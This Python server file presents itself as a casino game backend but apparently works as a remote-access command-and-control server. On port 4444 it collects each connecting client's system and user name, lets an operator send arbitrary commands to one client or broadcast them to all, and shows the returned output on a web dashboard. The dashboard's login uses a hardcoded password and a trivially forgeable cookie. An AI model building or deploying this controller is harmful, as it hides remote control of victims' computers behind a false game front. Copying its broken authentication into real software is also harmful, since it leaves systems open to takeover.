"""
Vivid Casino Engine — Game Backend Server

Manages player sessions, delivers admin commands,
hosts game modules, and provides the operator dashboard.
"""

import socket
import threading
import time
import os
import json
import uuid
from datetime import datetime

# Flask imports for web dashboard
try:
    from flask import Flask, render_template_string, request, redirect, url_for, flash
    from functools import wraps
except ImportError:
    print("[!] Flask not installed. Dashboard will not be available.")
    Flask = None

# Server configuration
GAME_HOST = "0.0.0.0"
GAME_SOCKET_PORT = 4444
DASHBOARD_PORT = 5000
MODULE_PORT = 8080

# Admin credentials (change in production)
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "Yuki8080*"

# Session management
session_lock = threading.Lock()
active_sessions = {}  # player_id -> PlayerSession

class PlayerSession:
    """Represents an active player connection."""
    
    def __init__(self, sock, player_id, addr):
        self.socket = sock
        self.player_id = player_id
        self.address = addr
        self.system_info = {}
        self.command_queue = []
        self.online = True
        self.log = []
        self.lock = threading.Lock()
        self._running = True
        self.last_heartbeat = time.time()
    
    def send_admin_command(self, command):
        """Queue an admin command for the player client."""
        with self.lock:
            self.command_queue.append(command)
    
    def update_log(self, msg):
        """Log a message from the player client."""
        self.log.append({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "message": msg
        })
        if len(self.log) > 100:
            self.log = self.log[-50:]
    
    def update_heartbeat(self):
        self.last_heartbeat = time.time()
    
    def is_stale(self):
        return time.time() - self.last_heartbeat > 60
    
    def close(self):
        self._running = False
        try:
            self.socket.close()
        except:
            pass


def net_send(sock, data):
    """Send length-prefixed packet."""
    try:
        encoded = data.encode()
        header = f"{len(encoded):08d}".encode()
        sock.sendall(header)
        sock.sendall(encoded)
        return True
    except:
        return False

def net_recv(sock, timeout=2):
    """Receive length-prefixed packet. Returns None on timeout, raises on connection loss."""
    old_timeout = sock.gettimeout()
    sock.settimeout(timeout)
    try:
        header = b""
        while len(header) < 8:
            chunk = sock.recv(8 - len(header))
            if not chunk:
                raise ConnectionResetError("Peer closed connection")
            header += chunk
        length = int(header.decode())
        if length <= 0 or length > 1048576:
            return None
        data = b""
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                raise ConnectionResetError("Peer closed connection")
            data += chunk
        return data.decode()
    except socket.timeout:
        return None
    finally:
        sock.settimeout(old_timeout)


def player_receiver(session):
    """Thread that receives data from player client."""
    while session._running:
        try:
            msg = net_recv(session.socket, timeout=5)
            if msg:
                session.update_log(msg)
                session.update_heartbeat()
                print(f"[*] [{session.player_id}] Received: {msg[:100]}")
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            print(f"[!] [{session.player_id}] Connection lost: {e}")
            break
        except Exception as e:
            print(f"[!] [{session.player_id}] Receive error: {e}")
            break
    
    session._running = False
    with session.lock:
        session.online = False
    with session_lock:
        if session.player_id in active_sessions:
            active_sessions[session.player_id].online = False
    try:
        session.socket.close()
    except:
        pass


def player_sender(session):
    """Thread that sends commands to player client."""
    while session._running:
        command = None
        with session.lock:
            if session.command_queue:
                command = session.command_queue.pop(0)
        
        if command:
            if not net_send(session.socket, command):
                print(f"[!] [{session.player_id}] Send failed")
                session._running = False
                break
            print(f"[*] [{session.player_id}] Sent: {command}")
        
        time.sleep(0.5)
    
    session._running = False


def handle_player(client_socket, addr):
    """Handle a new player connection."""
    player_id = f"player_{uuid.uuid4().hex[:8]}"
    session = PlayerSession(client_socket, player_id, addr)
    
    with session_lock:
        active_sessions[player_id] = session
    
    print(f"[*] New player session: {player_id} from {addr}")
    
    # Receive player system info
    try:
        info = net_recv(client_socket, timeout=10)
    except (ConnectionResetError, BrokenPipeError, OSError):
        print(f"[!] {player_id} disconnected before handshake")
        session.close()
        with session_lock:
            active_sessions.pop(player_id, None)
        return
    
    if info:
        pairs = {}
        for p in info.split('|'):
            if '=' in p:
                k, v = p.split('=', 1)
                pairs[k.lower()] = v
        session.system_info = pairs
        print(f"[*] {player_id} system: {pairs}")
    else:
        print(f"[!] {player_id} no handshake data")
        session.close()
        with session_lock:
            active_sessions.pop(player_id, None)
        return
    
    # Start receiver and sender threads
    session._running = True
    recv_thread = threading.Thread(target=player_receiver, args=(session,))
    send_thread = threading.Thread(target=player_sender, args=(session,))
    recv_thread.daemon = True
    send_thread.daemon = True
    recv_thread.start()
    send_thread.start()
    
    recv_thread.join()
    send_thread.join()
    
    with session_lock:
        active_sessions.pop(player_id, None)
    print(f"[*] Player session ended: {player_id}")


# ============ DASHBOARD ============

app = Flask(__name__) if Flask else None
if app:
    app.secret_key = os.urandom(24)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not request.cookies.get('vce_auth'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Vivid Casino — Operator Dashboard</title>
    <style>
        body { font-family: Arial; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
        h1 { color: #e94560; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #16213e; }
        .online { color: #4ecca3; }
        .offline { color: #e94560; }
        input, button { padding: 8px; margin: 4px; }
        button { background: #e94560; color: white; border: none; cursor: pointer; }
        .log { background: #0f0f23; padding: 10px; font-family: monospace; max-height: 200px; overflow-y: auto; }
    </style>
</head>
<body>
    <h1>🎰 Vivid Casino — Operator Dashboard</h1>
    <p>Active Player Sessions: {{ sessions|length }}</p>
    
    <table>
        <tr>
            <th>Player ID</th>
            <th>Status</th>
            <th>System</th>
            <th>User</th>
            <th>Last Active</th>
            <th>Actions</th>
        </tr>
        {% for sid, s in sessions.items() %}
        <tr>
            <td>{{ sid }}</td>
            <td class="{{ 'online' if s.online else 'offline' }}">
                {{ 'Online' if s.online else 'Offline' }}
            </td>
            <td>{{ s.system_info.get('system', 'Unknown') }}</td>
            <td>{{ s.system_info.get('user', 'Unknown') }}</td>
            <td>{{ '%.0f' % (now - s.last_heartbeat) }}s ago</td>
            <td>
                <form method="POST" action="/send_command" style="display:inline">
                    <input type="hidden" name="player_id" value="{{ sid }}">
                    <input type="text" name="command" placeholder="Command" size="20">
                    <button type="submit">Send</button>
                </form>
            </td>
        </tr>
        {% if s.log %}
        <tr>
            <td colspan="6">
                <div class="log">
                    {% for entry in s.log[-10:] %}
                    [{{ entry.timestamp }}] {{ entry.message[:200] }}<br>
                    {% endfor %}
                </div>
            </td>
        </tr>
        {% endif %}
        {% endfor %}
    </table>
    
    <h3>Quick Commands</h3>
    <form method="POST" action="/broadcast_command">
        <input type="text" name="command" placeholder="Broadcast command to all players" size="50">
        <button type="submit">Broadcast</button>
    </form>
    
    <p><a href="/logout" style="color:#e94560">Logout</a></p>
</body>
</html>
"""

if app:
    @app.route('/')
    @login_required
    def dashboard():
        now = time.time()
        with session_lock:
            sessions = dict(active_sessions)
        return render_template_string(DASHBOARD_HTML, sessions=sessions, now=now)
    
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        if request.method == 'POST':
            if request.form.get('username') == ADMIN_USERNAME and \
               request.form.get('password') == ADMIN_PASSWORD:
                resp = redirect(url_for('dashboard'))
                resp.set_cookie('vce_auth', '1')
                return resp
            flash('Invalid credentials')
        return """
        <form method="POST">
            <h2>Vivid Casino — Operator Login</h2>
            <input name="username" placeholder="Username"><br>
            <input name="password" type="password" placeholder="Password"><br>
            <button type="submit">Login</button>
        </form>
        """
    
    @app.route('/logout')
    def logout():
        resp = redirect(url_for('login'))
        resp.delete_cookie('vce_auth')
        return resp
    
    @app.route('/send_command', methods=['POST'])
    @login_required
    def send_command():
        player_id = request.form.get('player_id')
        command = request.form.get('command')
        if not player_id or not command:
            return "Missing parameters", 400
        
        client = None
        with session_lock:
            if player_id in active_sessions:
                client = active_sessions[player_id]
        
        if client:
            client.send_admin_command(command)
            time.sleep(3)
            return redirect(url_for('dashboard'))
        else:
            return "Player not found", 404
    
    @app.route('/broadcast_command', methods=['POST'])
    @login_required
    def broadcast_command():
        command = request.form.get('command')
        if not command:
            return "Missing command", 400
        with session_lock:
            for client in active_sessions.values():
                client.send_admin_command(command)
        return redirect(url_for('dashboard'))


def start_socket_server():
    """Start the game socket server for player connections."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.bind((GAME_HOST, GAME_SOCKET_PORT))
    server.listen(5)
    print(f"[*] Game server listening on {GAME_HOST}:{GAME_SOCKET_PORT}")
    
    while True:
        try:
            client_socket, addr = server.accept()
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            print(f"[*] Player connection from {addr}")
            thread = threading.Thread(target=handle_player, args=(client_socket, addr))
            thread.daemon = True
            thread.start()
        except Exception as e:
            print(f"[!] Server error: {e}")


def start_dashboard():
    """Start the web dashboard."""
    if app:
        print(f"[*] Dashboard starting on http://0.0.0.0:{DASHBOARD_PORT}")
        app.run(host='0.0.0.0', port=DASHBOARD_PORT, debug=False, threaded=True)
    else:
        print("[!] Dashboard disabled (Flask not installed)")


if __name__ == '__main__':
    # Start game socket server
    socket_thread = threading.Thread(target=start_socket_server)
    socket_thread.daemon = True
    socket_thread.start()
    
    # Start dashboard
    start_dashboard()
